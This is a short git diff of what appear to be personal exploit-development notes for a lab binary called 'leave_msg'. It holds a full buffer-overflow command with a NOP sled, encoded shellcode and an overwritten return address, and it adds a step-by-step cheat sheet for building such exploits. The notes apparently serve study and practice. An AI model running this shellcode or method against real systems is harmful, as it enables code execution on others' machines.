@@ -788,3 +788,24 @@ We run the program outside `gdb`
 gdb -q leave_msg
 
 ./leave_msg $(python -c 'print "\x55" * (2060 - 124 - 95 - 4) + "\x90" * 124 + "\xd9\xeb\xd9\x74\x24\xf4\x5d\x29\xc9\xb8\xfc\x4b\xe3\x50\xb1\x12\x31\x45\x17\x03\x45\x17\x83\x39\x4f\x01\xa5\xf0\x8b\x32\xa5\xa1\x68\xee\x40\x47\xe6\xf1\x25\x21\x35\x71\xd6\xf4\x75\x4d\x14\x86\x3f\xcb\x5f\xee\xc0\x2b\xa0\xef\x56\x2e\xa0\xfe\xfa\xa7\x41\xb0\x65\xe8\xd0\xe3\xda\x0b\x5a\xe2\xd0\x8c\x0e\x8c\x84\xa3\xdd\x24\x31\x93\x0e\xd6\xa8\x62\xb3\x44\x78\xfc\xd5\xd8\x75\x33\x95" + "\x8A\xD6\xFF\xFF"')
+
+# Cheat sheet
+
+
+1. check filetype
+this could be objdump or just normal file check
+
+2. Testing buffer with MSFvenom to find the `EIP`
+- Make the buffer file
+- Running the made buffer
+
+3. running gdb -q
+4. Disassemble main
+5. Checking the adress
+6. Checking bad characters
+7. Making exploit without the bad characters
+8. Running maybe a clean version of the exploit to find the return adress
+9. Using everything together with python
+
+need also a sheet for subtracting the numbers
+
